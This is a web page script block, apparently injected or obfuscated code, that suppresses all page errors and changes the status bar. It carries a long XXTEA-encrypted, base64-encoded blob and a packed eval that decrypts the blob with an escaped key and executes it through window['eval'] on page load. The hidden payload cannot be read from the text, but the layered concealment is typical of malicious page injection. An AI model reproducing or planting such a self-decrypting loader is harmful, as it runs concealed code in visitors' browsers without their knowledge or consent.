<script>window.onerror=function(){return true;}</script>
<script>
/*Extreme*/
window.defaultStatus="Íê³É";
Status="utf8to16";
function utf8to16(str){var out,i,len,c;var char2,char3;out=[];len=str.length;i=0;while(i<len){c=str.charCodeAt(i++);switch(c>>4)
{case 0:case 1:case 2:case 3:case 4:case 5:case 6:case 7:out[out.length]=str.charAt(i-1);break;case 12:case 13:char2=str.charCodeAt(i++);out[out.length]=String.fromCharCode(((c&0x1F)<<6)|(char2&0x3F));break;case 14:char2=str.charCodeAt(i++);char3=str.charCodeAt(i++);out[out.length]=String.fromCharCode(((c&0x0F)<<12)|((char2&0x3F)<<6)|((char3&0x3F)<<0));break;}}
return out.join('');}
var base64DecodeChars=new Array(-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,-1,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,-1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1);
function base64decode(str)
{var c1,c2,c3,c4;var i,len,out;len=str.length;i=0;out = "";while(i<len)
{do
{c1=base64DecodeChars[str.charCodeAt(i++)&0xff]}while(i<len&&c1==-1);if(c1==-1)
break;do
{c2=base64DecodeChars[str.charCodeAt(i++)&0xff]}while(i<len&&c2==-1);if(c2==-1)
break;out+=String.fromCharCode((c1<<2)|((c2&0x30)>>4));do
{c3=str.charCodeAt(i++)&0xff;if(c3==61)
return out;c3=base64DecodeChars[c3]}while(i<len&&c3==-1);if(c3==-1)
break;out+=String.fromCharCode(((c2&0XF)<<4)|((c3&0x3C)>>2));do
{c4=str.charCodeAt(i++)&0xff;if(c4==61)
return out;c4=base64DecodeChars[c4]}while(i<len&&c4==-1);if(c4==-1)
break;out+=String.fromCharCode(((c3&0x03)<<6)|c4)}
return out}
function long2str(v,w){var vl=v.length;var sl=v[vl-1]&0xffffffff;for(var i=0;i<vl;i++)
{v[i]=String.fromCharCode(v[i]&0xff,v[i]>>>8&0xff,v[i]>>>16&0xff,v[i]>>>24&0xff);}
if(w){return v.join('').substring(0,sl);}
else{return v.join('');}}
function str2long(s,w){var len=s.length;var v=[];for(var i=0;i<len;i+=4)
{v[i>>2]=s.charCodeAt(i)|s.charCodeAt(i+1)<<8|s.charCodeAt(i+2)<<16|s.charCodeAt(i+3)<<24;}
if(w){v[v.length]=len;}
return v;}
function xxtea_decrypt(str,key){if(str==""){return"";}
var v=str2long(str,false);var k=str2long(key,false);var n=v.length-1;var z=v[n-1],y=v[0],delta=0x9E3779B9;var mx,e,q=Math.floor(6+52/(n+1)),sum=q*delta&0xffffffff;while(sum!=0){e=sum>>>2&3;for(var p=n;p>0;p--){z=v[p-1];mx=(z>>>5^y<<2)+(y>>>3^z<<4)^(sum^y)+(k[p&3^e]^z);y=v[p]=v[p]-mx&0xffffffff;}
z=v[n];mx=(z>>>5^y<<2)+(y>>>3^z<<4)^(sum^y)+(k[p&3^e]^z);y=v[0]=v[0]-mx&0xffffffff;sum=sum-delta&0xffffffff;}
return long2str(v,true);}
t="hNuKNGDvR0x3eA4A6QFqsfpBLgNEtN0+pQWKT0MZeJiH29199sqdUBqXuQ0B6yFWPLfVWTpOzDrqHkJSS0D78HBNScWE4mfbwY7kwx2JW8BhqY8NKh8JVD63V9G4qU1ISzE/KUUv2YogXhTbPP8j8pc3bGfngBdUQOpOHvGv+f+8o2y9FzNd6YEJW/ZEY8IiMgJncFZ8BT12pC5mWmNUQZWqpLdDRHKFraUgVpyfUn9rTvzV8RekA0hGmixW0WPqdK/3WLmW9JMVAUEwouHeQBGtIL97WQWRLAXTQvpRsF539r++84/C+8OXCX14wWxDi+dp7zIVpqVyharDuzIPlYtEbNcoTvmQMa2gPPueLYA9d3nQGlBZLM+ayyLALe53hlztHvl8GAx9B1j3l6q623iO8MHx5Ck/Wcgo7YktKZQhwAxH2c5R/A9I/y0U0eg2qPApODR5A/DHQOzkhox2fUxGaO7NuqoID3SGSI9uREVy33qsPH8yh0Uapi/nkZfwscNQQygMbDtGrNKHtw/Or/YeNQk3neFMow0F1EyJHUJvGgKNHHdZXRTDdvSNMLvb7aHKAwQ5oOkZioEIz/yVOHbe3Dc3DoawgKHrR8O0FXVGvqMruC3FXHQsduFxEr+sj+ByuRu1nP+DP42coAABfORvjCdT6+azX4VA3syEQgksy3EITNvut1GSn2vgdCnFD1Is7CHhAzpmge4e78OHV2XYpLsMAD2VM0fCJoN3siM+gOPJ6f6sgiLDRLXD6/3T4kUjpGrzj4quPI9MsXI6XwotBaQgEXmKQul4kD6XhyzmdVUtGBDoPOLcpYwt9JCc2LibcGyqAee+o+BWoUuIhn3zR3i8wVQN36oGP+VarbtwWWzeDQoADIM0FkaO2X2zMGjthJFaaaGup9qvwcUMxZDrUniE21qzAG61X5blVCqhzPKQSQunz7EPk9waQyszccnTEmn5a6DVxYDu82DGmQB/e/64DiW+VubOX9MahDcz1Clatzba/mYz9w9ET+u4Z8xAYGuiBYsaEVFCxADBxvNKbms2bCAebMIiWALAUsnMeF4Q+tjOW2dLVm2kERzKYxbOh2fhfsXeIIoAXMt91qi1WHr9nsgNzeUF8kDYNS5Rgf9PcujzoaHMnLnP3pbYG7cropNJRvaFWqessujQvJKl56mddRDVhNJNXnjjY2T+rkTIKwxqJYL4gLD/X/g7jvEwyjcYAsi8rfe0Uhti4XDPvzZhpCBxsJZ8j4lYD0Ww6YYPPP1tMMn5l1tmh0QMKmHI7wedTvn7w8Z0zjxIGTrthCMow+l5zAwoskQPwFTnkEVV61NVrOUIfAGpaTcaJP0gk55in+1KVPO+GrcS7GQm1dUcdprbyVUcZDHVO1K5WzcnzquMsBI/yS0t5PL113Y9221iOgxmoFF/mTUd8MD9DhRp3lGHwXCjwMJ2j6xVuYKVDBpHtBRjnYdRJ4EUchpNWgWVCGt59YoCHCPl18YbENY0+EOxQaiZKLgzUVDEiU6vLSXJlw6m1uDkr8aQqgro4fKJE/ERyiT2rabrAX/72AqGbXtu5zXk7wciq//hj1luHfu9ciiNRkA/3mU4dF1/hOrGp5TuaFg/OKkkIZ/LQ4zC4S134yZ1i9ik63ynlx4UYrhUhHqIa0EGR8z4MF2YF7FwbHSbxdCbtE3mMxQLSbUzOmtAaaH2FTGk91Q0CYUbETiRI7zvR6LufTn144GcyDfGHIZeizoNoCel7mJZC64v7spsPLAW6BB3K265nQj5+Ip2SDrkp4mjg2GY+wWfeB3DImwLQK2XEiUQDWNFkgYPBher3Vc11UB5nWrEf4YF+CVnK+SlhhptBIKm6ueCORCjT3dTXNiUF/gA9AltST+iJ7i9NPCFnD0sy2q5kp+oP1JeVN71LYeIBp+WJNZLf2GALIQOzT9qVYBdl0F/UV81J/17ITvLiCs0IBXl9iURExA3OyN9mg1V4W9NrMNRPyiFyV6pve1zFi7zB9Mr07KhxM/pIhqywKyRypBajWOMRuXigt0p8kPutZjRPlRgQtZ559ObHXA1sU6ASWTFstWic7o8a0pXYpJg+5smQlS8W0i1jyNA8bp86sdFGfRY0KRqqPKV8UTPaRuuYN4LsnPxvhMSwr15/XzmCEcmXIrm98ShorLrkZ8N9+6duWFTpVbGE2hQLC3PREUNPkGIzbZqvCXmcDvQJiIh71JR34Rkqr5yZ4XdSBcbycFPYw5BJ52phjbiHzr1Cl3Lm91/L2J1Nn5J4W7UL7B6Qm2maEhR3mMMa6TrZGWuRR0UpLsnEFLK7QPnvRXcRbFrStB/ATVubKw7NPH29abLwlZuIqXifeXjJbxry5K3dfEeCot7sLETBSilhAfX2TdbN6xgNgPF0u4O7hGA9xJncX7gyqufryIT1KODgjMb7y97RuKBnySLWEhWg8zJTAfnA06nIjUZXEL3FMqtxNQmGvvqRgmXrZSyhmadIeqt8oGLpXMblI8Ta8lAkzecgsv5hkn8UtelsX2kq5C5lZUb86IsilMtcigpkhlpmgJiVvw3OcYUHd0hf4DO3/2Hgqc9tLILTX0Szkb5bQzrjlRBbaNCGYHk6W44nvA5iu64eDSih6QUQXNqN40tCH6OBXInpoLqxUvcXzzcmzykFOLu7FtnPPvTT9eofOpAvCInmNMuGC0tIGOSZuWjnXU3mk64TIUcrTaH4OH2a5UAqy2TkM9MJaJw5LgV5XWBqQ7+WfPCD0NZRRmkSZk5e8kSVKXZs3f/J+aLlUBojQgVDoEQA71MCtGCA62rKCcacpKzhWaLxXLKxfedOTDkKQIkJoUb1876z5YAPnbcoo2/7vb4zQAcJf7G3XH+ux2OGoT3ypGqd4dU0b0yKnD4h0P6o4ATA+boiU5M+gekATalqcD9CqbIKrRIP7kQ+4u+Z5CBn7VdUUfXyGXNN41E+UL849Dl/6HhlBG75EwOLLlkBUO13CmFml2HAzg+qlO6qfrO+tsojfuAfikFJIiWxzqCmjfOCNbsJX3t7pzKZgYMiyjVnKKAF2t6pEwUSTmqgSfqhShawxqmeWUpzQav1cxhQn/Lz0n6jFQGGnKLkZdjar7BsSJEPI7wfelQcaKlCanDVHcF2STbuz1CvWprGEuw3FwZsOeq+0bzl3azyydSb/ZxplHYCuSzUZ89YBOPA3pKGa+h3IPnTvAtx7YA+un6OAQJ+xozw7Ww5/LIDOnMofwt1F/Z7YxnACrSca12BoXQncGCitVj2MfxevlsZTxy4WC19M8cGpiPjBQjQIXhds1hOoSfVcBVFiOmGySQ6WsAdb70R3Xwix+7pMRnnHvqA0ofi5oslbaw+4wGad3IEwJp8QwnS/jJnxTmmbNdz9VYaN+MhidsEHm0Od/2F4XMIvm1DR41fKgtYGIuSTyO4lZbqH76cRPlmEd5YUcZR0+T5lo5j/H2JKBJsrkm1WP/7phjYm3jI9vNoUaR9j/0h6McIKPLsWQYFLsHnZ+lfdKra+p0jUpPKU8fdUZRhpEpg7eConVLxrVC58UoHH1ATJOc36PGENba6ZvfOr4ZV3oP4V0Dt2IQ0CnlYbcGZ+klUmwjvVlnGlSAWy8xbejPvpBrldaUOJxPES1QPcwA+hMDuGu4gjXa0ssWKjkp5/17bfuZ8k82lYTWQSHdYNg2e4hA6ngVEeIdmt8yqfx+k9K5H3paSwvmQr4Ramb1cPNfYuRoyStIfUOkP1i8KHD9Xc09K045ZCE4LtPa2v9OLqGxYdeFcnQPOHmOu11MxcQqB6OR8j9SCrR7WI0j0Wl8/sLx6UcF4Crbib4NncGUGSQvRl3v4vf5Oh2SoeXWJYDVpS/Me8V43Y0iVCDxqB3j+GiXrh+ZPtZQFlAU8vymp31VGB9pXEzaTruMOXkS868woF0A38iuHGRM9I4INmRoxfhduDRbHZ7lpIjxBOLdb+IfjFboltNyYlU2umNSwUSA+TZHo3Ys6d7IUN6qH+AtXUyquDRfcmhjIES9AiDm/zksBgMf/0zQpiBAFPVQfqgVSmEuqlGeEERF34VAOZpR8yLgTV+LHHFAOelqmet3ujwzNWnwJLv8HioUQP5NoGyFa0bmAADz+bfsc4w5";
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0=4(5(3(0),\'\\2\\1\\6\\d\\7\'));c["\\b\\a\\8\\9"](0);',14,14,'t|x75|x66|base64decode|utf8to16|xxtea_decrypt|x63|x31|x61|x6c|x76|x65|window|x6b'.split('|'),0,{}))
/*Extreme*/
</script>